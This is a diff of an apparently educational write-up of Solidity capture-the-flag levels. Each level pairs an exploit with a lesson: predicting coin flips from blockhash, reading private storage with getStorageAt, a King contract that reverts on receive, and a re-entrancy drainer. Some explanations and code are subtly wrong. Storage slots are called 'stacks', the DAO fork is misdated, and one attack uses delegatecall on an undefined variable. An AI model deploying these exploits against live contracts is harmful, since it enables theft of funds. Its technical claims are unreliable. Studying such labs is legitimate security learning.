@@ -63,30 +63,30 @@ Step 3 - Feed into contract 10 times over, with slight delays between each
 
     contract CoinFlipAttack {
 
-    uint256 lastHash;
-    address  public victimContract;
-    uint256 FACTOR =  57896044618658097711785492504343953926634992332820282019728792003956564819968;
-   
-    constructor(address _victimContractAddress)  {
-	    victimContract = _victimContractAddress;
-    }
-        
-    function flipResult(uint _blockNumber)  public  returns  (bool side)  {
-	    uint256 blockValue =  uint256(blockhash(_blockNumber));
-	    if  (lastHash == blockValue)  {
-			revert();
-		}
-		lastHash = blockValue;
-		uint256 coinFlip = blockValue / FACTOR;
-	    side = coinFlip ==  1  ?  true  :  false;
-    }
-    
-      
-    
-    function attackContract()  external  returns(bool success)  {
-	    bool guess = flipResult(block.number);
-	    (success,  )  = attackContractAddress.delegatecall(abi.encodeWithSignature("flip(bool)", guess));
-	   }
+	    uint256 lastHash;
+	    address  public victimContract;
+	    uint256 FACTOR =  57896044618658097711785492504343953926634992332820282019728792003956564819968;
+	   
+	    constructor(address _victimContractAddress)  {
+		    victimContract = _victimContractAddress;
+	    }
+	        
+	    function flipResult(uint _blockNumber)  public  returns  (bool side)  {
+		    uint256 blockValue =  uint256(blockhash(_blockNumber));
+		    if  (lastHash == blockValue)  {
+				revert();
+			}
+			lastHash = blockValue;
+			uint256 coinFlip = blockValue / FACTOR;
+		    side = coinFlip ==  1  ?  true  :  false;
+	    }
+	    
+	      
+	    
+	    function attackContract()  external  returns(bool success)  {
+		    bool guess = flipResult(block.number);
+		    (success,  )  = attackContractAddress.delegatecall(abi.encodeWithSignature("flip(bool)", guess));
+		   }
     }
 
 **Learning** - 
@@ -172,9 +172,9 @@ In this case, our contract has no implementation - so no contract code to exploi
     // SPDX-License-Identifier: MIT
     pragma  solidity  ^0.8.7;
     
-    contract DelegationAttack {
+    contract ForceAttack {
     
-    address  public victimContract;
+	    address  public victimContract;
     
 	    constructor(address _victimContractAddress)  payable  {
 		    require(msg.value <=  0.001 ether,  "Please seed the contract");
@@ -194,28 +194,122 @@ In this case, our contract has no implementation - so no contract code to exploi
 
 Spoiler alert - making a variable private does not mean only your contract can access it. Blockchains are inherently transparent, and private variables can be seen by a one who wants to, albeit with a little more effort. To do so, all we need to do is understand how a contract's data is stored. 
 
+Ethereum Virtual Machine (EVM) is a stack-based Turing-complete machine. This means it is different from your typical computer, which is register-based. The EVM's sotrage scheme is comprised of "stacks" of 32-bytes each. All in all, the EVM can have 2^256 such stacks. 
+
+Each smart contract has its own storage to reflect the state of the contract. The values in storage persist across different function calls. And each storage is tethered to the smart contract’s address. This means, by making a specific EVM-level call, you can access the stacks of each contract. 
+
  **Vulnerability** - The contract  password is stored as a private variable. 
 
 **Exploit** - 
 
+We know the password is stored as a 32-byes value. So, it will have a whole stack associated with it. In this case, this will be the stack at index 1.
+
+    web3.eth.getStorageAt(/* contractAddress */, 1)
+        
+The result will be hex value of the password we need. To convert it further, we can use the helpful utils library in web3.js - 
+
+    web3.utils.toAscii("")
+
+And finally, we will have the password we are looking for. 
+
+**Learning** - 
+
+ - Always store the **hash** of a confidential value, never the plain text.
+
+As the transaction sender, you are always susceptible to the following cases:
+
+## P9 - King 
+
+In this example, we are once again reminded that if our contract sends Ether to another one - it has to rely on the other contracts receiving mechanism to complete it's workflow. In other words, for a while, your contract is no longer in charge of it's own functioning. 
+
+Such a function call generally comes with three loopholes worth remembering - 
+
+-   **Issue 1**: The receiving contract doesn’t have a payable fallback function, cannot receive Ethers, and will throw an error upon a payable request.
+-   **Issue 2**: The receiving contract has a malicious payable fallback function that throws an exception and fails valid transactions.
+-   **Issue 3**: The receiving contract has a malicious payable function that consumes a large amount of gas, which fails your transaction or over-consumes your gas limit.
+
+Due to this, the "safe-transfer" workflow is generally recommended for solidity contracts. This contract does not follow that workflow at all. 
+
+ **Vulnerability** - The contract  relies on external agent for complete execution. 
+
+**Exploit** - 
+
+Step 1 - Make a bogus contract and transfer some Eth to the victim contract through that using a Delegate Call. Now you are the owner. 
+Step 2 - Implement a fallback function which always reverts whenever value is transferred to it. 
+Step 3 - Now, the other contract can never reclaim ownership from you. 
+
     // SPDX-License-Identifier: MIT
     pragma  solidity  ^0.8.7;
     
-    contract DelegationAttack {
+    contract KingAttack {
     
-    address  public victimContract;
-    
+	    address  public victimContract;
+	    uint256  public valueToExceed;
+	    
 	    constructor(address _victimContractAddress)  payable  {
-		    require(msg.value <=  0.001 ether,  "Please seed the contract");
+		    valueToExceed = _victimContractAddress.balance;
+		    require(msg.value > valueToExceed,  "Please seed the contract");
 		    victimContract = _victimContractAddress;
 	    }
-    
-	    function attackContract() external  {
-		    selfdestruct(payable(address(victimContract)));
+	    
+	    function attackContract()  external  payable  returns(bool success)  {
+		    require(msg.value > valueToExceed,  "This will not work");
+		    (success,  )  =  address(victimContract).call{value: valueToExceed}(abi.encodeWithSignature(""));
 	    }
-    }
     
+	    receive()  external  payable  {
+		    revert();
+	    }
+    
+    }
+
 **Learning** - 
 
- - Never use the balance of your contract as a check for anything, it can be altered
+-   Never assume transactions to external contracts will be successful
+-   Make sure to handle failed transactions on the client side in the event you do depend on transaction success to execute other core logic
+
+## P10 - Re Entrancy  
+
+If there's a celebrity exploit out there, it is this one. A re-entrancy attack, though quite un-intuitive at first - is the reason Ethereum had to be forked in 2017 into Eth Classic and Eth. I recommend you study this properly, so here is an [article](https://quantstamp.com/blog/what-is-a-re-entrancy-attack) for reference. 
+
+ **Vulnerability** - Withdrawal function is easily re-entrant. 
+
+**Exploit** - 
+
+Step 1 - Make a re-entracy attack contract, and implement the requisite fallback function in it 
+Step 2 - Call the withdrawal function repeatedly till the contract is safely out of Eth. 
+
+    // SPDX-License-Identifier: MIT
+    pragma  solidity  ^0.8.7;
+    
+    contract ReentrancyAttack {
+    
+	    address  public victimContract;
+	    event WithdrawalPerformed(uint256  indexed _valueExtracted,  bool _status);
+	    
+	    constructor(address _victimContractAddress)  payable  {
+		    require(msg.value >=  0.001 ether,  "Please seed the contract");
+		    victimContract = _victimContractAddress;
+	    }
+	    
+	    function attackContract()  external  payable  returns(bool success)  {
+		    require(msg.value >=  0.001 ether,  "Please seed the contract");
+		    (success,  )  =  address(victimContract).call{value:  0.001 ether}(abi.encodeWithSignature("donate(address)",  address(this)));
+	    }
+	    
+	    function withdrawLoot()  external  returns(bool success){
+		    payable(msg.sender).transfer(address(this).balance);
+		    success =  true;
+	    }
+	    
+	    receive()  external  payable  {
+		    if  (address(victimContract).balance >  0)  {
+		    (bool success,  )  =  address(victimContract).call(abi.encodeWithSignature("withdraw(uint)",  address(victimContract).balance));
+		    emit WithdrawalPerformed(address(victimContract).balance, success);
+		    }
+	    }
+    
+    }
+     
+
 
